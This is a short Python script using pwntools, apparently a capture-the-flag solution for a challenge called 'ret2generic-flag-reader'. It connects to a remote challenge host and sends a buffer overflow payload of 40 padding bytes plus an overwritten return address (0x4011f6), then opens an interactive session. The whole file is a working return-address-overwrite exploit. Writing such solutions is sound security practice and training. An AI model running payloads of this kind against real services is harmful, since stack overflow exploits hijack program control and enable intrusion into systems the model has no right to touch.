from pwn import *

#s = process("./ret2generic-flag-reader")
s = remote("mc.ax", 31077)
s.recvuntil("?\n")
s.sendline(b"A" * 40 + p64(0x4011f6))
s.interactive()
